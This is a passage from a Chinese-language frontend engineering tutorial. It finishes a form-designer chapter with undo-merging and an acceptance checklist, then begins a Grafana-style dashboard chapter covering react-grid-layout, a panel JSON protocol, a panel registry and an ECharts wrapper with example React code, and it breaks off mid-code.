**根因**：每次 keystroke 都是一次 `updateProps` → 一条历史记录（未合并）；同时输入框的原生撤销栈与全局补丁历史双轨并行，各自为政。

**修法**：双管齐下——(1) 补丁合并：setter 上报时带 `mergeKey: 'props:${nodeId}:${prop}'`，store 的 mutate 分支把 300ms 内同 key 的补丁并入最后一条（逆补丁新在前，见路线 7 的顺序分析）；(2) 全局接管 Cmd+Z：window keydown 里 `preventDefault()`（含输入框内），浏览器原生撤销栈从此不参与，单一事实来源是补丁历史。两者缺一：只做 (1) 输入框内按 Cmd+Z 仍走原生逐字；只做 (2) 历史里是碎补丁，一次 Cmd+Z 也只回一个字。

✅ **产出**：拖 5 种物料搭建表单 → 导出 schema → 用第 2 章渲染器渲染并提交，**设计器↔渲染器闭环**。

验收清单（全部勾掉才算本章毕业）：

- [ ] 物料区 5 种叶子物料（input/textarea/select/number/switch）+ 分组容器可拖入画布；拖到空分组、拖到已有节点前、拖到根容器空白，三种落点行为全部正确
- [ ] 画布内排序：同容器内上下拖动顺序正确；跨容器拖动节点真实迁移；把分组拖进自己的子孙子分组被正确拒绝（自嵌套守卫）
- [ ] 嵌套容器用例：分组里套分组，组件拖进内层分组落点是内层（pointerWithin + 最内层优先策略生效）；拖到容器间隙仍能就近吸附（closestCorners 兜底）
- [ ] 编辑态交互隔离：点击 select 不弹下拉、开关不切换、textarea 不聚焦输入；预览模式下全部恢复正常交互
- [ ] 选中态完整：outline 不引起布局抖动、角标显示物料名、悬浮操作条四个按钮（上移/下移/复制/删除）全部生效且不触发误拖拽
- [ ] Setter 自举：给物料加一个新可配置项只改 materials/registry.ts 一行声明，属性面板自动出现对应控件；改属性面板任意值，画布预览即时更新
- [ ] 自定义 Setter：选项编辑器可增删改下拉候选，表达式输入框写错表达式有提示
- [ ] 快捷键：Cmd+Z/Cmd+Shift+Z（Windows Ctrl 同效）撤销重做、Delete/Backspace 删除、Cmd+D 复制；在属性面板输入框内打字时按 Delete 删的是字符不是节点
- [ ] 撤销手感：属性面板连续输入"员工姓名"后一次 Cmd+Z 整词回退；拖拽移动 + 属性修改交替操作后多步撤销/重做全部回到正确状态
- [ ] 闭环验收：拖出至少 8 个节点（含一个分组、一个含 3 个候选的 select）→ 导出 JSON → 清空画布 → 导入恢复 → 预览模式用第 2 章渲染器渲染 → 填写并触发必填校验 → 提交成功输出 formData

## 4. Grafana 式拖拽仪表盘（2 周）

**业务画像**：数据可视化大盘、BI 工具、监控面板，编辑态拖拽布局配图表，运行态定时刷新。

在动第一行代码之前，先想清楚本章和第 3 章表单设计器的本质差异，这决定了技术选型的全部分岔：

1. **布局从"任意嵌套树"退化为"平面栅格"**。面板之间不嵌套、不重叠，只排位置和大小。于是拖拽不必再用 dnd-kit 自己写碰撞与落点判定——react-grid-layout 把"量化网格 + 碰撞 + 自动紧凑"整套做好了。复杂度没有消失，而是转移到了**布局协议**和**数据链路**上。
2. **出现了"时间"维度**。全局时间范围（from/to）、自动刷新、数据点数控制，全是表单场景没有的问题，也是监控大盘区别于普通图表页的三件套。
3. **数据获取成为一等公民**。第 2、3 章的组件渲染的是静态 props（schema / formData），本章的面板渲染的是"查询结果"。查询从哪来、怎么发、怎么复用——这就引出本章的灵魂：**数据源抽象**（路线 5）。

对照第 0 章的内核六件套，本章的落点：Schema 协议 = dashboard JSON（layout + panels 双数组）；组件注册表 = panel registry；递归渲染器退化为"平铺面板渲染"（树深度为 1，不需要递归）；Setter 体系 = 面板配置抽屉（panel options 又是一张 schema 表单，第二次复用）；表达式引擎本章暂不展开（Grafana 用它做变量联动，思路同第 2 章 `visibleWhen`）；Undo/Redo 在编辑态改布局时接底座即可。

学习顺序仍然是总原则那句"先做渲染器，再做编辑器"：先让一个写死 layout 的大盘在"查看态"跑起来（能查数、能刷、能联动时间），再做"编辑态"（拖拽、缩放、配置抽屉），最后做导入导出。反过来做（先搭拖拽再塞数据）会让你在数据不通时无法判断布局 bug 还是渲染 bug。

### 实现路线

1. 布局层：`react-grid-layout`（拖拽 + 缩放 + 碰撞 + 自动 compact），理解 layout model：`{ i, x, y, w, h, static? }` 与 24 列栅格
2. 面板协议：`{ id, type: 'line'|'bar'|'stat'|'table', title, query, options }`；layout 与 panel 用 id 关联
3. **面板插件化**：panel registry（复用底座注册表），新增面板类型零侵入
4. 图表封装：echarts 统一组件（ResizeObserver 自适应、卸载 dispose、loading/空态）
5. **数据源抽象**：`interface DataSource { query(q, timeRange): Promise<Frame[]> }`，实现 mock 数据源（随机游走序列）+ 静态 JSON 数据源 —— 这是 Grafana 插件体系的精髓
6. 时间范围：全局 store（from/to），面板订阅；与 URL 查询参数双向同步（可分享链接）
7. 自动刷新：interval 定时器；`visibilitychange` 页面隐藏时暂停；面板级节流
8. 编辑/查看双模式：编辑态布局可拖 + 右侧配置抽屉（panel options 用第 3 章 Setter 渲染，又复用！）
9. 持久化：layout + panels 合并为 dashboard JSON，导入/导出

### 路线 1：布局层 —— react-grid-layout 的 layout model、24 列栅格与 compact 算法

**是什么**。react-grid-layout（下称 RGL）是一个"网格坐标驱动"的布局组件：你不写 CSS 位置，而是给每个子元素一个 `{x, y, w, h}` 的网格坐标，RGL 负责把它们换算成像素、处理拖拽/缩放、在发生重叠时按规则推挤、并在留出空洞时自动上浮面板。

**为什么用量化网格而不是自由拖拽（绝对定位）**。四个理由：① 坐标是整数，天然可 JSON 序列化持久化；② 响应式只需换"列数"重算，不需要为每档屏幕重排（自由画布做不到）；③ 碰撞判定是矩形求交，O(n²) 都绰绰有余；④ 用户心智简单——"半行宽、三分之一行宽"这种语言产品经理也能用。Grafana、AWS CloudWatch 大盘、多数 BI 工具都是这个路线。

**layout model 逐字段**。RGL 的 layout 是一个数组，每项字段如下（TypeScript 类型 `Layout` 从包里导出）：

| 字段 | 含义 | 说明 |
|---|---|---|
| `i` | 面板唯一 id | 必须与对应子元素的 React `key` 完全一致，这是 layout 与面板的关联键 |
| `x` | 左上角列坐标 | 0 到 `cols - w` 之间，不是像素 |
| `y` | 左上角行坐标 | 可以很大（比如 100），compact 会把它拉回紧凑位置 |
| `w` | 宽度，单位=列数 | 24 列栅格下 w=12 即半行 |
| `h` | 高度，单位=行数 | 实际像素 = `h * rowHeight + (h - 1) * rowGap`（margin 的垂直分量） |
| `static` | 是否钉死 | `true` 时该面板不可拖不可缩，且 compact 时别人绕开它、它绝不让位——适合做"置顶公告栏" |
| `minW/maxW/minH/maxH` | 缩放上下限 | 防止用户把折线图缩成 1 列宽的"电线杆" |
| `isDraggable/isResizable` | 单项开关 | 覆盖容器级的全局开关，可实现"这个面板锁位置但可缩放" |
| `moved` | RGL 内部标记 | 拖动过程标记，**持久化时应剔除**，不要把它写进你的协议 |

**24 列栅格怎么算像素**。列宽公式：

```text
colWidth = (容器宽度 - (cols - 1) * marginX - 2 * containerPaddingX) / cols
面板像素宽 = w * colWidth + (w - 1) * marginX
面板像素高 = h * rowHeight + (h - 1) * marginY
```

为什么是 24 而不是 RGL 默认的 12？因为 24 能被 2、3、4、6、8、12 整除——"半行、三分之一行、四分之一行"都是整数列，设计师排版的常用比例全能表达。Grafana 同样是 24 列。列数只是个 prop（`cols={24}`），但**它必须写进协议文档**：导入的 JSON 若按 12 列设计，在 24 列栅格里会全部缩在左半边。

**碰撞与 compact 的直观解释**。把网格想成一个"重力朝上"的箱子：

- 两个面板碰撞的定义就是矩形相交：`a.x < b.x + b.w && b.x < a.x + a.w && a.y < b.y + b.h && b.y < a.y + a.h`。
- 拖动一个面板压到别人时，被压的面板被**向下推**，推到不碰撞为止；被推的面板又可能压到更下面的，级联下去。
- `compactType="vertical"`（默认）：任何面板下方出现的空洞都会让更下面的面板**上浮**填补，就像失重环境下气泡上浮。上浮算法可以概括为：把所有面板按 `y` 升序、`x` 升序排序，逐个尝试把当前面板的 y 往上移到"再移一格就会碰到已放置面板"的位置，然后放置；static 面板最先按原位固定，普通面板绕行。
- `compactType={null}`：不 compact，删掉面板留下空洞（Grafana 的 "strict" 布局），适合"位置有语义"的场景（比如第 0 行永远是告警面板）。
- `preventCollision`：禁止重叠时的兜底策略；`allowOverlap`（较新版本）允许面板叠放，监控大盘基本用不到。

```
删除面板 A 前：                      删除 A 后（compactType='vertical'）：
   x=0      x=12                       x=0      x=12
y=0 ┌───A────┬───B────┐            y=0 ┌───C────┬───B────┐
    │        │        │                │        │        │
y=4 ├───C────┴────────┤            y=4 └────────┴────────┘
                                   C 自动上浮；B 在 A 右侧不受影响
```

**完整可运行示例（单断点 + WidthProvider）**：

```tsx
// src/dashboard/GridDemo.tsx —— 最小可运行的栅格示例
import { useState } from 'react';
import GridLayout, { WidthProvider } from 'react-grid-layout';
import type { Layout } from 'react-grid-layout';
// 两个样式文件必须引入：缺了会表现为"拖不动、右下角缩放手柄消失"的诡异现象
import 'react-grid-layout/css/styles.css';
import 'react-resizable/css/styles.css';

const Grid = WidthProvider(GridLayout); // HOC：包一层"会量宽度"的容器

const PANEL_KEYS = ['a', 'b', 'c', 'd'];

const INITIAL: Layout = [
  { i: 'a', x: 0,  y: 0, w: 8,  h: 6 },
  { i: 'b', x: 8,  y: 0, w: 10, h: 6 },
  { i: 'c', x: 18, y: 0, w: 6,  h: 6 },
  { i: 'd', x: 0,  y: 6, w: 24, h: 4, static: true }, // 钉死在最下方的公告栏
];

export function GridDemo() {
  const [layout, setLayout] = useState<Layout>(INITIAL);
  return (
    // 宽度来源：这个 div 必须能被量出确定宽度（父链上别出现内容撑开的 flex）
    <div style={{ width: '100%', minWidth: 0 }}>
      <Grid
        layout={layout}
        cols={24}            // 24 列栅格
        rowHeight={32}       // 一行的基准高度（px），配合 h=9 大约 300px 面板
        margin={[8, 8]}      // 面板间水平/垂直间距
        isDraggable
        isResizable
        compactType="vertical"
        onLayoutChange={(next) => setLayout(next)} // 拖/缩/compact 后的最终布局回写
      >
        {PANEL_KEYS.map((key) => (
          <div key={key} style={{ background: '#fff', border: '1px solid #d9d9d9', borderRadius: 6, padding: 8 }}>
            panel {key}
          </div>
        ))}
      </Grid>
    </div>
  );
}
```

**WidthProvider 与 Responsive 的用法，以及"容器宽度是谁量出来的"**。RGL 网格要换算像素就必须知道容器宽度，但它不该自己去猜——于是官方给了 `WidthProvider` 这个 HOC：它在网格外包一个 div，用 ResizeObserver 监听这个 div 的宽度，存进 state，再作为 `width` prop 注入网格。简化后的内核长这样（示意代码，帮助你理解而非源码拷贝）：

```tsx
// WidthProvider 的原理示意
function withWidth(Composed: React.ComponentType<any>) {
  return function Measured(props: Record<string, unknown>) {
    const [width, setWidth] = useState(-1);
    const ref = useRef<HTMLDivElement>(null);
    useEffect(() => {
      const el = ref.current!;
      const ro = new ResizeObserver(() => setWidth(el.offsetWidth));
      ro.observe(el); // 容器宽度变化（侧栏折叠、窗口缩放、父级动画）都会触发
      setWidth(el.offsetWidth);
      return () => ro.disconnect();
    }, []);
    return (
      <div ref={ref} style={{ width: '100%', minWidth: 0 }}>
        {width > 0 ? <Composed {...props} width={width} /> : null /* 量出宽度前不渲染，避免 0 宽首帧 */}
      </div>
    );
  };
}
```

理解这个原理后你就明白坑 1 的一切症状从哪来（容器在 tab 里 `display:none`、父级是没设宽的 flex item、首帧 0 宽闪烁），也知道绕开 HOC 的正路：如果你项目里已有全局的容器测量（比如 SplitPane 自己管宽度），可以直接给 `<GridLayout width={number}>` 传数值，跳过 WidthProvider。

**多断点响应式（Responsive）**：`Responsive` 组件按断点选择不同的 layout 数组和列数：

```tsx
// src/dashboard/ResponsiveGridDemo.tsx —— 多断点：每档一份 layout
import { useState } from 'react';
import { Responsive, WidthProvider } from 'react-grid-layout';
import type { Layouts } from 'react-grid-layout';
import 'react-grid-layout/css/styles.css';
import 'react-resizable/css/styles.css';

const ResponsiveGrid = WidthProvider(Responsive);

const BREAKPOINTS = { lg: 1200, md: 996, sm: 768, xs: 480, xxs: 0 }; // 容器宽度阈值（px）
const COLS = { lg: 24, md: 24, sm: 12, xs: 8, xxs: 4 };              // 每档列数：屏越窄列越少，面板相对越宽

const INITIAL_LAYOUTS: Layouts = {
  lg: [{ i: 'a', x: 0, y: 0, w: 12, h: 6 }, { i: 'b', x: 12, y: 0, w: 12, h: 6 }],
  md: [{ i: 'a', x: 0, y: 0, w: 12, h: 6 }, { i: 'b', x: 12, y: 0, w: 12, h: 6 }],
  sm: [{ i: 'a', x: 0, y: 0, w: 12, h: 8 }, { i: 'b', x: 0, y: 8, w: 12, h: 8 }], // 窄屏改单列堆叠
  xs: [{ i: 'a', x: 0, y: 0, w: 8, h: 8 },  { i: 'b', x: 0, y: 8, w: 8, h: 8 }],
  xxs: [{ i: 'a', x: 0, y: 0, w: 4, h: 8 }, { i: 'b', x: 0, y: 8, w: 4, h: 8 }],
};

export function ResponsiveGridDemo() {
  const [layouts, setLayouts] = useState<Layouts>(INITIAL_LAYOUTS);
  return (
    <ResponsiveGrid
      layouts={layouts}
      breakpoints={BREAKPOINTS}
      cols={COLS}
      rowHeight={32}
      onLayoutChange={(layout, allLayouts) => setLayouts(allLayouts)} // 注意：第二个参数才是全档布局
      onBreakpointChange={(bp, cols) => console.log('断点切换到', bp, '列数', cols)}
    >
      <div key="a">面板 a</div>
      <div key="b">面板 b</div>
    </ResponsiveGrid>
  );
}
```

两个易错点提前打预防针：① 用 `Responsive` 时必须传复数 `layouts`（对象）而不是 `layout`（数组），且回调要接第二个参数，否则断点切换时布局会互相覆盖；② 本章的 dashboard 协议（路线 9）为了简化只持久化一份 24 列的基准 layout——多档 layouts 的维护成本（拖了 lg 又拖 sm，谁同步谁？）远超监控场景收益，Grafana 的选择也是"单一 24 列 + 小屏线性堆叠"。Responsive 用在"仪表盘首页要适配手机"这类真需求上。

**本步小结的常见坑**：容器量宽失败（症状与修法见坑 1 详解）、`layout` 里出现子元素没有的 key（RGL 控制台告警 + 幽灵占位，见坑 4）、拖拽手柄与图表事件打架（见路线 8 的 `draggableHandle`）。

### 路线 2：面板协议 —— layout 与 panel 用 id 关联的数据结构

**是什么**。把"一个面板是什么"与"一个面板在哪"拆成两份数据，用 `id` 关联：

```ts
// src/dashboard/types.ts
export type PanelType = 'line' | 'bar' | 'stat' | 'table';

/** 数据查询：面板声明"我要什么数据"，查询体本身是数据源私有的 */
export interface DataQuery {
  refId: string;                       // 面板内唯一，一个面板可发多条查询（A/B/C…）
  payload: Record<string, unknown>;    // 数据源私有查询体：PromQL、SQL、mock 参数……核心代码不解释它
}

export interface LineOptions { unit?: string; area?: boolean; legend?: boolean }
export interface BarOptions  { unit?: string; stack?: boolean }
export interface StatOptions { unit?: string; decimals?: number; dangerAbove?: number }
export interface TableOptions { pageSize?: number }

export interface PanelBase {
  id: string;                // 稳定 id：nanoid 生成，绝不复用已删除面板的 id
  title: string;
  datasourceUid: string;     // 指向 dashboard.doc.datasources[].uid
  query: DataQuery;
}

/** discriminated union：type 字面量决定 options 的形状，switch 分支里 TS 自动收窄 */
export type Panel =
  | (PanelBase & { type: 'line';  options: LineOptions  })
  | (PanelBase & { type: 'bar';   options: BarOptions   })
  | (PanelBase & { type: 'stat';  options: StatOptions  })
  | (PanelBase & { type: 'table'; options: TableOptions });

/** 与 react-grid-layout 的 Layout 同构；显式声明，协议自持、不依赖第三方类型 */
export interface LayoutItem {
  i: string;                 // = panels[].id，唯一关联键
  x: number;
  y: number;
  w: number;
  h: number;
  static?: boolean;
  minW?: number; maxW?: number; minH?: number; maxH?: number;
}

export interface DataSourceRef {
  uid: string;               // 大盘内唯一，面板通过它引用数据源
  type: string;              // 'mock-random-walk' | 'static-json' | 未来的 'prometheus'
  options: Record<string, unknown>;
}

export interface DashboardDoc {
  version: 1;                              // 协议版本号：一开始就带上（第 6 章 migration 的前提）
  meta: { title: string; updatedAt: number };
  time: { from: number; to: number; refreshMs: number }; // 大盘默认时间范围与刷新间隔
  datasources: DataSourceRef[];
  panels: Panel[];
  layout: LayoutItem[];
}
```

对应的合法 JSON 样例（也是路线 9 导出的目标格式）：

```json
{
  "version": 1,
  "meta": { "title": "交易核心大盘", "updatedAt": 1760000000000 },
  "time": { "from": 1759996400000, "to": 1760000000000, "refreshMs": 30000 },
  "datasources": [
    { "uid": "ds-walk",   "type": "mock-random-walk", "options": {} },
    { "uid": "ds-static", "type": "static-json",      "options": {} }
  ],
  "panels": [
    {
      "id": "p_qps",
      "type": "line",
      "title": "QPS",
      "datasourceUid": "ds-walk",
      "query": { "refId": "A", "payload": { "seriesName": "qps", "seriesCount": 3, "volatility": 12, "baseline": 800 } },
      "options": { "unit": "req/s", "area": true, "legend": true }
    },
    {
      "id": "p_err",
      "type": "stat",
      "title": "错误率",
      "datasourceUid": "ds-walk",
      "query": { "refId": "A", "payload": { "seriesName": "err", "seriesCount": 1, "volatility": 2, "baseline": 3 } },
      "options": { "unit": "%", "decimals": 2, "dangerAbove": 5 }
    }
  ],
  "layout": [
    { "i": "p_qps", "x": 0,  "y": 0, "w": 16, "h": 9 },
    { "i": "p_err", "x": 16, "y": 0, "w": 8,  "h": 9 }
  ]
}
```

**为什么拆两个数组、用 id 关联**（而不是像 Grafana 那样把 `gridPos` 内嵌在 panel 里）：① RGL 的 `onLayoutChange` 天然吐出一个纯 layout 数组，双数组结构可以零转换直接回写 store；② 查看态渲染只关心 panels，编辑器拖动只改 layout，两份变更互不制造无谓的 diff；③ 面板配置抽屉更新 panel 对象时不会触碰布局。代价是**删除面板必须两处同删**——这正是坑 4，我们会在 store 层用单一 action 封死这个风险。两种设计都对，关键是把一致性收敛到一个入口。

id 的纪律：用 `nanoid()` 这类短随机 id；不要用数组下标（拖动排序即变化）；不要用标题拼音（用户改标题就断链）；导入 JSON 冲突时宁可重新生成 id 并同步改 layout，也不要容忍两份 panels 出现同一个 id。

### 路线 3：面板插件化 —— panel registry

**解决什么问题**。"新增一种仪表盘面板"应该是一个纯增量动作：写一个新组件文件、注册、完事。不该去改渲染器、改类型收口、改配置抽屉的 switch。要做到这一点，就把"面板类型 → 组件 + 元信息"的映射收进注册表（底座 1.2 的直接复用，只是物料从表单控件换成图表面板）：

```tsx
// src/dashboard/panelRegistry.tsx
import type { ComponentType } from 'react';
import type { Panel } from './types';
import type { SeriesFrame } from '../datasource/types';
import type { SetterSchema } from '../setter/SetterForm'; // 第 3 章的 Setter 声明协议，原样复用

/** 面板组件拿到的输入：面板声明 + 数据帧。组件是纯渲染者，不自己发请求 */
export interface PanelComponentProps<O = unknown> {
  panel: Panel & { options: O };
  data: { status: 'loading' | 'ok' | 'error' | 'empty'; frames: SeriesFrame[]; error?: string };
  width: number;   // 面板内容区实时像素宽（外壳用 ResizeObserver 量好传入）
  height: number;
}

/** 一种面板类型的完整定义 = 物料元信息 + 组件 */
export interface PanelDefinition<O = unknown> {
  type: string;                 // 'line' | 'bar' | ... 协议里的 type 字符串
  label: string;                // 物料区/新增面板下拉框显示的名字
  defaultW: number;             // 新增面板的默认尺寸
  defaultH: number;
  defaultOptions: O;            // 新增面板的默认配置
  setters: SetterSchema[];      // 配置抽屉自动生成表单的声明（第 3 章 Setter，又复用）
  Component: ComponentType<PanelComponentProps<O>>;
}

const panelRegistry = new Map<string, PanelDefinition<any>>();

export function registerPanel(def: PanelDefinition<any>) {
  if (panelRegistry.has(def.type)) console.warn(`面板类型重复注册：${def.type}，后注册的覆盖前者`);
  panelRegistry.set(def.type, def);
}
export function getPanelDefinition(type: string) {
  return panelRegistry.get(type);
}
export function listPanelTypes() {
  return [...panelRegistry.keys()];
}
```

渲染入口统一走一个 `PanelHost`，未知类型给兜底卡片而不是抛白屏：

```tsx
// src/dashboard/PanelHost.tsx
import { getPanelDefinition } from './panelRegistry';
import type { PanelComponentProps } from './panelRegistry';

export function PanelHost(props: PanelComponentProps) {
  const def = getPanelDefinition(props.panel.type);
  if (!def) {
    // 导入了不认识的面板类型（旧文件、别人私加的物料）→ 显式兜底，别让整个大盘崩掉
    return <div className="panel-fallback">未知面板类型：{props.panel.type}</div>;
  }
  const C = def.Component;
  return <C {...props} />;
}
```

四个面板的注册与实现（`Component` 的具体代码在路线 4 的 echarts 封装就绪后给出，见 `registerPanels.tsx`）。至此"新增 gauge 面板" = 新建 `GaugePanel.tsx` + 一行 `registerPanel({...})`，渲染器、类型、抽屉零改动——这就是"零侵入"的验收标准。

### 路线 4：图表统一封装 —— echarts 组件与 setOption 时机

**为什么必须统一封装**。四个面板都画 echarts，如果各自 `echarts.init`，会踩同一批坑四次：实例泄漏（忘了 dispose）、resize 只监听 window（栅格缩放不触发）、loading/空态样式不一、notMerge 时机各写各的。封装成一个 `EChart` 组件，把生命周期纪律固化：

```tsx
// src/dashboard/EChart.tsx —— echarts 统一封装
import { useEffect, useRef } from 'react';
import * as echarts from 'echarts';

type EChartsInstance = ReturnType<typeof echarts.init>;

export interface EChartProps {
  option: echarts.EChartsOption;
  /** 结构签名：变了才 notMerge 全量替换；没变走 merge 增量更新（见下文时机讲解） */
  structureKey: string;
  loading?: boolean;
  empty?: boolean;
}

export function EChart({ option, structureKey, loading = false, empty = false }: EChartProps) {
  const containerRef = useRef<HTMLDivElement>(null);
  const chartRef = useRef<EChartsInstance | null>(null);
  const prevStructureRef = useRef<string>(structureKey);

  // 生命周期：init 一次、dispose 一次；resize 跟随容器而不是 window
  useEffect(() => {
    const el = containerRef.current;
    if (!el) return;
    const chart = echarts.init(el);
    chartRef.current = chart;

    // 关键：监听容器自身。栅格拖拽缩放改的是 grid item 的 style 宽高，window resize 根本不会触发
    const ro = new ResizeObserver(() => {
      // 容器 display:none（切 tab）或首帧未布局完成时尺寸为 0，resize 到 0 会得到一张坏画布
      if (el.clientWidth > 0 && el.clientHeight > 0) chart.resize();
    });
    ro.observe(el);

    return () => {
      ro.disconnect();
      chart.dispose();       // 释放 canvas 上下文、事件监听、内部定时器——不 dispose 就是内存泄漏
      chartRef.current = null;
    };
  }, []);

  // 数据/结构更新：loading 由 React 状态驱动，option 更新区分 merge / notMerge
  useEffect(() => {
    const chart = chartRef.current;
    if (!chart || empty) return;
    const notMerge = structureKey !== prevStructureRef.current; // 结构变了才全量替换
    prevStructureRef.current = structureKey;
    if (loading) chart.showLoading('default', { text: '', color: '#c0c4cc', maskColor: 'rgba(255,255,255,0)' });
    else chart.hideLoading();
    chart.setOption(option, { notMerge });
  }, [option, structureKey, loading, empty]);

  // 空态用"覆盖层"而不是条件渲染换掉容器：换了 DOM，echarts 实例就悬空在游离节点上了
  return (
    <div style={{ position: 'relative', width: '100%', height: '100%' }}>
      <div ref={containerRef} style={{ position: 'absolute', inset: 0 }} />
      {empty && <div className="echart-empty">暂无数据</div>}
    </div>
  );
}
```

四个细节值得逐一解释：

1. **ResizeObserver 监听容器而非 window**。这是图表在"可拖拽缩放的栅格"里能自适应的根本原因：RGL 缩放面板时改的是该 grid item 的行内样式，window 没有任何事件。RO 观察的是元素自身的盒尺寸，天然覆盖窗口缩放、侧栏折叠、栅格拖缩三种场景。
2. **dispose**。echarts 实例持有 canvas 上下文（浏览器对同页 canvas/WebGL 上下文数量有限制，Chrome 触顶后新图表直接黑屏）、全局事件监听和动画定时器。React 18/19 开发模式 StrictMode 会故意"挂载→卸载→再挂载"一次，cleanup 写对了这只是多花一次 init 的钱；写错了就是每次路由进出都漏一个实例，Performance 面板里 JS Heap 阶梯上涨。
3. **loading/空态**。`showLoading` 只在"已有旧数据、正在刷"时启用才有意义（不然 5s 一刷的大盘整页转圈）。首屏没有数据时应显示空态文案。loading 遮罩样式里把 maskColor 设为透明，避免遮住旧数据——Grafana 的刷新就是"旧图保持可见，新数据到了无感替换"。
4. **merge vs notMerge 的时机**（坑 2 的正面讲解）。`setOption(option)` 默认是 **merge 模式**：新 option 与图表当前状态按组件索引/名称合并，series 数量变少时**多余的旧 series 不会被删除**，坐标轴、图例的残留同理。所以：
   - **同结构、只换数据**（自动刷新 tick 到了，还是那 3 条序列、还是折线图）→ merge。便宜、不重置内部状态（用户选过的图例、dataZoom 视口、无动画跳变）。
   - **结构变化**（series 数量/名字变了、面板从 line 切到 bar、单轴变双轴）→ 必须全量替换，否则出现"幽灵序列"。上面的实现用 `structureKey`（面板 id + 类型 + 序列名列表拼成的字符串）自动判断；也可以用更细粒度的 `chart.setOption(option, { replaceMerge: ['series'] })`——只整体替换 series、其余仍 merge，适合"序列集合常变但坐标系不动"的面板。
   - 一个粗暴但常用的替代：`<EChart key={structureKey} ...>` 让 React 整个重挂。能用，但代价是丢图例选择/缩放状态 + 重新 init，不作为首选。

基于 `EChart` 的四个面板实现与注册：

```tsx
// src/dashboard/panels.tsx —— line / bar / stat / table 四种面板 + 注册
import { useMemo } from 'react';
import * as echarts from 'echarts';
import type { PanelComponentProps } from './panelRegistry';
import { registerPanel } from './panelRegistry';
import { EChart } from './EChart';
import type { SeriesFrame } from '../datasource/types';

/** 帧集合 → 折线/柱状 option。line 与 bar 只差 series.type，共用一个转换器 */
function framesToCartesianOption(
  frames: SeriesFrame[],
  kind: 'line' | 'bar',
  opts: { area?: boolean; legend?: boolean; unit?: string },
): echarts.EChartsOption {
  const series = frames.map((f) => {
    const time = (f.fields.find((x) => x.type === 'time')?.values ?? []) as number[];
    const num = (f.fields.find((x) => x.type === 'number')?.values ?? []) as number[];
    return {
      name: f.name,
      type: kind,
      smooth: true,
      showSymbol: false,
      sampling: 'lttb',   // echarts 内置的 LTTB 降采样：点再多也只画"视觉保真"的若干点（坑 3 主力手段）
      areaStyle: kind === 'line' && opts.area ? {} : undefined,
      data: num.map((v, i) => [time[i]!, v] as [number, number]),
    };
  });
  return {
    animation: false,     // 高频刷新场景关动画：每 5s 整图重播一次入场动画是灾难
    grid: { left: 48, right: 16, top: opts.legend === false ? 16 : 40, bottom: 28 },
    legend: opts.legend === false ? undefined : {},
    tooltip: {
      trigger: 'axis',
      showDelay: 40,      // tooltip 防抖：快速划过时不逐点计算浮层
      valueFormatter: (v) => (opts.unit ? `${v} ${opts.unit}` : `${v}`),
    },
    xAxis: { type: 'time' },
    yAxis: {},
    series,
  };
}

function ChartPanel({ panel, data }: PanelComponentProps) {
  const kind = panel.type === 'bar' ? 'bar' : 'line';
  const options = panel.options as { area?: boolean; legend?: boolean; unit?: string };
  const option = useMemo(
    () => framesToCartesianOption(data.frames, kind, options),
    [data.frames, kind, options],
  );
  // 结构签名 = 类型 + 序列名集合：序列增删/换图型 → notMerge；纯数据刷新 → merge
  const structureKey = `${panel.id}:${kind}:${data.frames.map((f) => f.name).join('|')}`;
  return <EChart option={option} structureKey={structureKey} empty={data.status === 'empty'} />;
}

function StatPanel({ panel, data, width, height }: PanelComponentProps) {
  const frame = data.frames[0];
  const latest = useMemo(() => {
    const numField = frame?.fields.find((f) => f.type === 'number');
    if (!numField || numField.values.length === 0) return null;
    return numField.values[numField.values.length - 1] as number; // 时间序列最后一个点 = "当前值"
  }, [frame]);
  if (!frame || latest === null) return <div className="echart-empty">暂无数据</div>;
  const o = panel.options as { unit?: string; decimals?: number; dangerAbove?: number };
  const danger = o.dangerAbove !== undefined && latest > o.dangerAbove;
  return (
    <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', height: '100%', paddingLeft: 16 }}>
      <div style={{ fontSize: Math.min(48, Math.max(20, height * 0.35)), fontWeight: 700, color: danger ? '#cf1322' : '#262626' }}>
        {latest.toFixed(o.decimals ?? 0)}
        <span style={{ fontSize: 14, marginLeft: 4, color: '#8c8c8c' }}>{o.unit ?? ''}</span>
      </div>
      <div style={{ color: '#8c8c8c' }}>{frame.name}</div>
    </div>
  );
}

function TablePanel({ panel, data }: PanelComponentProps) {
  const frame = data.frames[0];
  if (!frame || frame.fields.length === 0) return <div className="echart-empty">暂无数据</div>;
  const o = panel.options as { pageSize?: number };
  const rowCount = frame.fields[0]!.values.length;
  const rows = frame.fields[0]!.values
    .map((_, rowIdx) => frame.fields.map((f) => f.values[rowIdx])) // 列式 → 行式，仅渲染需要的前 N 行
    .slice(0, o.pageSize ?? 50);
  return (
    <div style={{ overflow: 'auto', height: '100%' }}>
      <table className="panel-table" style={{ width: '100%', fontSize: 12, borderCollapse: 'collapse' }}>
        <thead>
          <tr>{frame.fields.map((f) => <th key={f.name} style={{ textAlign: 'left', padding: '4px 8px' }}>{f.name}</th>)}</tr>
        </thead>
        <tbody>
          {rows.map((row, i) => (
            <tr key={i}>
              {row.map((cell, j) => <td key={j} style={{ padding: '4px 8px' }}>{String(cell)}</td>)}
            </tr>
          ))}
        </tbody>
      </table>
      {rowCount > rows.length && <div style={{ color: '#8c8c8c', padding: 8 }}>仅展示前 {rows.length} 行（共 {rowCount} 行）</div>}
    </div>
  );
}

// —— 注册：新增面板类型 = 在这里加一段，别处零改动 ——
registerPanel({
  type: 'line', label: '折线图', defaultW: 12, defaultH: 9,
  defaultOptions: { unit: '', area: false, legend: true },
  setters: [
    { key: 'unit',   label: '单位',     setter: 'input'  },
    { key: 'area',   label: '面积填充', setter: 'switch' },
    { key: 'legend', label: '显示图例', setter: 'switch' },
  ],
  Component: ChartPanel,
});
registerPanel({
  type: 'bar', label: '柱状图', defaultW: 12, defaultH: 9,
  defaultOptions: { unit: '', stack: false, legend: true },
  setters: [
    { key: 'unit',   label: '单位',     setter: 'input'  },
    { key: 'legend', label: '显示图例', setter: 'switch' },
  ],
  Component: ChartPanel, // 同一组件：kind 由 panel.type 推出
});
registerPanel({
  type: 'stat', label: '单值面板', defaultW: 6, defaultH: 6,
  defaultOptions: { unit: '', decimals: 0, dangerAbove: undefined },
  setters: [
    { key: 'unit',        label: '单位',       setter: 'input'  },
    { key: 'decimals',    label: '小数位',     setter: 'number' },
    { key: 'dangerAbove', label: '超阈值标红', setter: 'number' },
  ],
  Component: StatPanel,
});
registerPanel({
  type: 'table', label: '表格', defaultW: 12, defaultH: 8,
  defaultOptions: { pageSize: 50 },
